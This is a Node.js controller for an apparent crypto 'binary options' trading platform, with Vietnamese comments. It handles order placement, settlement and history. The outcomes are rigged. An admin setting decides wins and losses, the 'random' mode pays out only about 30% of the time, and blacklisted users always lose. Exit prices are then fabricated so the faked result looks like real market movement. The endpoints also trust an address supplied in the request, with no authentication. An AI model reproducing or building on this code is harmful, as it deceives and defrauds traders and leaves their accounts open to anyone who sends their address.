const db = require("../../app/models");
const dbAdmin = require("../../admin/models");
const OrderHistory = db.order_history;
const User = db.user;
const Coin = db.coin;
const Crypto = db.crypto;
const Setup = dbAdmin.setup;
const Config = dbAdmin.config;
var jwt = require("jsonwebtoken");
const config = require("../config/auth.config");
exports.order = async (req, res) => {
  try {
    let {
      address,
      product_name, // Tên sản phẩm
      order_type, // Kiểu lệnh (long/short)
      amount, // Số tiền đặt
      order_duration, // Thời gian đặt lệnh (60s/90s/180s)
    } = req.body;

    const dataUser = await User.findOne({ where: { address } });
    if (!dataUser) throw new Error("INVALID_USER");
    if (parseInt(dataUser.dataValues.balance_usdt) < parseInt(amount)) {
      return res
        .status(200)
        .json({ success: false, message: "Số dư không đủ" });
    }
    let amountFloat = parseFloat(amount).toFixed(2);

    const dataCoin = await Crypto.findOne({ where: { symbol: product_name } });
    if (!dataCoin) throw new Error("INVALID_COIN");
    const entry_price = dataCoin.dataValues.current_price;

    let profit_percentage = 50;
    switch (order_duration) {
      case "60s":
        profit_percentage = 50;
        break;
      case "90s":
        profit_percentage = 60;
        break;
      case "180s":
        profit_percentage = 70;
        break;
      case "300s":
        profit_percentage = 80;
        break;
      case "500s":
        profit_percentage = 90;
        break;
      default:
        profit_percentage = 50;
        break;
    }

    const profitT = (amountFloat * profit_percentage) / 100;

    dataUser.balance_usdt -= amountFloat;
    await dataUser.save();
    // Thêm dữ liệu vào bảng "order_history"
    const newOrder = await OrderHistory.create({
      user_id: dataUser?.id,
      name: product_name,
      order_type,
      profit_percentage,
      amount: amountFloat,
      profit: parseFloat(profitT),
      order_duration,
      entry_price,
    });
    const order_id = newOrder.dataValues.id;
    const time = parseInt(order_duration);

    processOrder(order_id, dataUser?.id, time);
    res.status(200).json({
      success: true,
      newOrder,
    });
  } catch (error) {
    console.error("Đã xảy ra lỗi:", error);
    res.status(200).json({ success: false, message: error.message });
  }
};

function processOrder(order_id, userId, time) {
  try {
    for (let i = 0; i < time; i++) {
      setTimeout(async () => {
        console.log("order" + i);
      }, 1000 * i);
    }
    setTimeout(async () => {
      const dataNow = await OrderHistory.findOne({ where: { id: order_id } });
      console.log("🚀 ~ setTimeout ~ dataNow:", dataNow.dataValues);
      if (dataNow.dataValues.order_result == "pending") {
        let resultFinal = "";
        const blackList = await Config.findByPk(1);
        let check = blackList.dataValues.black_list;
        let blackListArray = "";
        if (!check) {
          check = "0";
        } else {
          blackListArray = check.split("|");
        }

        if (blackListArray.includes(userId)) {
          resultFinal = "lose";
        } else {
          const rs = await Setup.findAll();

          rs.map((item) => {
            if (item.type == "order_result") {
              return (resultFinal = item.value);
            }
          });

          //random by ex
          if (resultFinal == "random") {
            const randomNum = Math.floor(Math.random() * 100);
            if (randomNum <= 30) {
              resultFinal = "win";
            } else {
              resultFinal = "lose";
            }
          }
        }
        let negativeProfit = null; // Đặt giá trị mặc định cho negativeProfit
        let exitPrice;
        if (resultFinal === "win") {
          await OrderHistory.update(
            { order_result: resultFinal },
            {
              where: { id: order_id },
            }
          );
          //thay đổi số dư
          const balance_now = await changeBalance(
            dataNow.profit,
            dataNow.amount,
            userId
          );
          //reset status finished
          const updateData = { status_time: "finished", balance_now };
          await dataNow.update(updateData);

          //
          if (dataNow.order_type === "long") {
            // Cập nhật exit_price là entry_price + random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) +
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          } else if (dataNow.order_type === "short") {
            // Cập nhật exit_price là entry_price - random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) -
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          }
        } else if (resultFinal === "lose") {
          negativeProfit = parseFloat(dataNow.profit) * -1;
          if (dataNow.order_type === "long") {
            // Cập nhật exit_price là entry_price - random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) -
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          } else if (dataNow.order_type === "short") {
            // Cập nhật exit_price là entry_price + random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) +
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          }
        }

        const updateData = { order_result: resultFinal, exit_price: exitPrice };
        if (negativeProfit !== null) {
          updateData.profit = negativeProfit;
        }
        await OrderHistory.update(updateData, {
          where: { id: order_id },
        });
        return;
      }
      if (dataNow.dataValues.status_time == "win") {
        const balance_now = await changeBalance(
          dataNow.profit,
          dataNow.amount,
          userId
        );
        //reset status finished
        const updateData = { status_time: "finished", balance_now };
        await dataNow.update(updateData);
        return;
      } else {
        console.log("had done");
        return;
      }
    }, time * 1150);
  } catch (error) {
    res.status(200).json({ success: false, message: error.message });
  }
}

exports.listing_order = async (req, res) => {
  try {
    const { limit, page, address } = req.query;
    const dataUser = await User.findOne({ where: { address } });
    if (!dataUser) throw new Error("INVALID_USER");
    const query = `SELECT * FROM order_histories WHERE user_id = :userId ORDER BY createdAt DESC LIMIT :limit OFFSET :page`;

    const result = await db.sequelize.query(query, {
      replacements: {
        userId: dataUser?.id ? parseInt(dataUser?.id) : null,
        limit: limit == undefined ? 10 : parseInt(limit),
        page: page == undefined ? 0 : parseInt(page),
      },
      type: db.sequelize.QueryTypes.SELECT,
    });

    const countQuery = `SELECT COUNT(*) AS total FROM order_histories WHERE user_id = :userId`;
    const countResult = await db.sequelize.query(countQuery, {
      replacements: {
        userId: dataUser?.id ? parseInt(dataUser?.id) : null,
      },
      type: db.sequelize.QueryTypes.SELECT,
    });

    const total = countResult[0].total;

    res.status(200).json({
      success: true,
      result,
      count: total,
    });
  } catch (error) {
    console.error("Đã xảy ra lỗi:", error);
    res.status(500).json({ success: false, error: error.message });
  }
};

exports.transaction_result = async (req, res) => {
  try {
    const { address, order_id } = req.query;

    const dataUser = await User.findOne({ where: { address } });
    if (!dataUser) throw new Error("INVALID_USER");
    const dataOrder = await OrderHistory.findOne({ where: { id: order_id } });

    const currentTime = new Date();
    const numericValue = parseInt(dataOrder.order_duration);
    const timeCheck = numericValue * 1000;
    let exitPrice;
    if (currentTime - dataOrder.createdAt > timeCheck) {
      const dataNow = await OrderHistory.findOne({ where: { id: order_id } });

      if (dataNow.order_result != "pending") {
        if (dataNow.order_result == "win") {
          if (dataNow.status_time == "win") {
            const balance_now = await changeBalance(
              dataNow.profit,
              dataNow.amount,
              dataUser?.id
            );
            //reset status time = finished
            const updateData = { status_time: "finished", balance_now };
            await dataNow.update(updateData, { where: { id: order_id } });
          }
          // const cost = parseFloat(dataNow.profit) + parseFloat(dataNow.amount);
          // await User.increment("balance", {
          //   by: parseFloat(cost),
          //   where: { id: userId },
          // });
          res.status(200).json({
            success: true,
            dataNow,
          });
        } else if (dataNow.order_result == "lose") {
          res.status(200).json({
            success: true,
            dataNow,
          });
        }
      } else {
        const rs = await Setup.findAll();
        let resultFinal = "";
        rs.map((item) => {
          if (item.type == "order_result") {
            return (resultFinal = item.value);
          }
        });

        let negativeProfit = null; // Đặt giá trị mặc định cho negativeProfit
        //ok
        if (resultFinal === "random") {
          const randomNum = Math.floor(Math.random() * 100);
          if (randomNum <= 30) {
            resultFinal = "win";
          } else {
            resultFinal = "lose";
          }
        }
        if (resultFinal === "win") {
          // Nếu kết quả là win
          // Cập nhật profit là số tiền đặt cược nhân với tỉ lệ lợi nhuận
          await OrderHistory.update(
            { order_result: resultFinal },
            {
              where: { id: order_id },
            }
          );
          const balance_now = await changeBalance(
            dataNow.profit,
            dataNow.amount,
            dataUser?.id
          );
          const updateData = { status_time: "finished", balance_now };
          await dataNow.update(updateData);
          //update in out
          if (dataNow.order_type === "long") {
            // Cập nhật exit_price là entry_price + random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) +
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          } else if (dataNow.order_type === "short") {
            // Cập nhật exit_price là entry_price - random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) -
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          }
        } else if (resultFinal === "lose") {
          negativeProfit = parseFloat(dataNow.profit) * -1;
          if (dataNow.order_type === "long") {
            // Cập nhật exit_price là entry_price - random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) -
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          } else if (dataNow.order_type === "short") {
            // Cập nhật exit_price là entry_price + random trong khoảng 2% đến 10%
            const randomPercentage = (Math.random() * (0.3 - 0.1) + 0.1) / 100;
            exitPrice = (
              parseFloat(dataNow.entry_price) +
              parseFloat(dataNow.entry_price) * randomPercentage
            ).toFixed(8);
          }
        }

        const updateData = { order_result: resultFinal, exit_price: exitPrice };
        if (negativeProfit !== null) {
          updateData.profit = negativeProfit;
        }

        const checkRs = await OrderHistory.update(updateData, {
          where: { id: order_id },
        });
        const datars = await OrderHistory.findOne({
          where: { id: order_id },
          order: [["createdAt", "DESC"]],
        });
        res.status(200).json({
          success: true,
          dataNow: datars ? datars.toJSON() : null,
        });
      }
    } else {
      res.status(200).json({
        success: true,
        message: "waiting",
      });
    }
  } catch (error) {
    console.error("Đã xảy ra lỗi:", error);
    res.status(200).json({ success: false, message: error.message });
  }
};
//function global

async function changeBalance(start, end, userId) {
  const user = await User.findByPk(userId);
  const balanceVal = parseFloat(user.dataValues.balance_usdt);
  const cost = balanceVal + parseFloat(start) + parseFloat(end);

  await User.update(
    { balance_usdt: parseFloat(cost) },
    { where: { id: userId } }
  );
  return cost;
}

exports.checkSpamOrder = async (req, res) => {
  try {
    const { address } = req.query;
    const dataUser = await User.findOne({ where: { address } });
    if (!dataUser) throw new Error("INVALID_USER");
    const pendingOrders = await OrderHistory.findAll({
      where: {
        order_result: "pending",
        user_id: dataUser?.id,
      },
    });

    // Kiểm tra xem có bản ghi nào là "pending" hay không
    if (pendingOrders.length > 0) {
      res
        .status(400)
        .json({ duplicate: true, message: "There is a Order running" });
    } else {
      res.status(200).json({ duplicate: false, message: "Oke" });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
};
